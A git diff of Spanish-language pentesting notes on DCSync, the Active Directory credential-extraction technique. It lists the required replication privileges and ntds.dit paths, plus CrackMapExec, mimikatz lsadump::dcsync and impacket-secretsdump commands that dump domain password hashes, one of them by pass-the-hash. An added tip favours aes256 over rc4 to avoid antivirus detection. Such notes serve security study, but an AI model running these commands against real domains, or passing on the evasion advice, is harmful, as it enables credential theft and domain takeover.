@@ -1,6 +1,6 @@
 # DCSync
 
-Tags: #AD #DCSync 
+Tags: #AD #DCSync #Persistencia #Windows 
 
 DCSync es una técnica de post-explotación en entornos Windows, específicamente en redes que operan con Active Directory (AD). Este método permite a un atacante con privilegios elevados imitar las funciones de un Controlador de Dominio (DC) para obtener información sensible de otros DCs. Entre los datos comprometidos se incluyen hashes de contraseñas de usuarios, claves de cifrado de Kerberos y otros elementos protegidos que normalmente solo están disponibles para los Controladores de Dominio.
 
@@ -22,36 +22,55 @@ El archivo de sistema, comúnmente conocido como el hive SYSTEM, contiene config
 
 Normalmente, puedes encontrar el archivo ntds.dit en dos ubicaciones:
 
-❯ systemroot\NTDS\ntds.dit
-❯ systemroot\System32\ntds.dit
+❯ 'systemroot\NTDS\ntds.dit'
+❯ 'systemroot\System32\ntds.dit'
     
 Y la ruta del SYSTEM en:
 
-❯ C:\Windows\System32\SYSTEM
+❯ 'C:\Windows\System32\SYSTEM'
 
 Es común que estos archivos sean el objetivo principal de herramientas de extracción de credenciales, como el ataque DCSync que emula el comportamiento de un controlador de dominio solicitando información de usuario de otros controladores de dominio sin necesidad de ejecutar código en el controlador de dominio objetivo.
 ```
 
+```bash 
+# Estos privilegios los tienen los usuarios 'Domain Admin' 
+
+1. DS-Replication-Get-Changes
+2. Replicating Directory Changes All
+3. Replicating Directory Changes In Filtered Set 
+```
+
 ## Utilizando CrackMapExec
 
-```powershell 
-❯ ./cme smb 3.14.245.175 -u "admin" -p "Password@1" -d "domain1.corp" --ntds
+```powershell
+# Comando para usuarios con altos privilegios 
+
+❯ ./cme smb 3.14.245.175 -u "admin" -p "Password@1" -d "domain1.corp" --ntds   # Nos muestra loas hashes de los usuarios, por lo que se puede hacer 'Pass-The-Hash'
 ```
 
 ## Utilizando Mimikatz
 
 ```powershell
-❯ .\mimikatz.exe # lsadump::dcsync /domain:domain1.corp /user:krbtgt
+❯ .\mimikatz.exe 
+	# lsadump::dcsync /domain:domain1.corp /user:krbtgt    # Obtener el hash NTLM
 ```
 
-## Para exfiltrar todos los usuarios del dominio:
-
 ```powershell
-❯ mimikatz # lsadump::dcsync /domain:domain1.corp /all /csv
+# Para exfiltrar todos los usuarios del dominio:
+
+❯ .\mimikatz.exe
+	# lsadump::dcsync /domain:domain1.corp /all /csv
 ```
 
 ## Utilizando Impacket-secretsdump
 
 ```powershell
-❯ impacket-secretsdump -debug -dc-ip 3.14.245.175 admin@domain1.corp -hashes :64fbae31cc352fc26af97cbdef151e03
+❯ impacket-secretsdump -debug -dc-ip <IP> admin@domain1.corp -hashes :64fbae31cc352fc26af97cbdef151e03 
+	
+	# debug = Obtener mas info 
+	# dc-ip = Dirección IP del DC
+	# upn 'UserPrincipalName' = Nombre del usuario y DC
+	# hashes = Hash del usuario 'NTLM'
+
+Nota: Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
 ```
